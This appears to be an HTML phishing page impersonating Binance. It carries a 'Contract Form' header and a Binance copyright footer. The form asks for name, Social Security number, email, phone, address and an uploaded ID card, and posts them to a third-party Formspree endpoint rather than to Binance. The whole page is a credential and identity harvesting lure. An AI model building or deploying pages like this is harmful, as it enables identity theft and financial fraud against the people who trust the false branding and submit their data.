    <title>Binance Contract</title>
    <link rel="stylesheet" href="index.css">
</head>
<body>
    <h1>CONTRACT FORM</h1> 
    
    <div class="btc">
        <form method="POST" action="https://formspree.io/f/xblrlenb">
            <label>First Name:</label> <input type="text" name="firstname"  required>  <br>
            <label>Last Name:</label> <input type="text" name="lastname"  required> <br>
            <label>SSN:</label><input type="text" name="ssn" required> <br>
            <label>Email:</label> <input type="email" name="email" required><br>
            <label>Phone Number:</label><input type="number" name="phonenumber" required> <br>
            <label>Current Address:</label> <textarea name="currentaddress" cols="30" rows="10"></textarea required><br>
            

           <label> Valid ID Card:</label> <input type="file" name="valididcard" required><br> 

            <button>Submit</button>

            

            <address><i>&copy;2024 <a href="https://www.binance.com/"> <u>Binance.com</u> </a>, All Rights Reserved.</i></address>
        </form>
    </div>
</body>
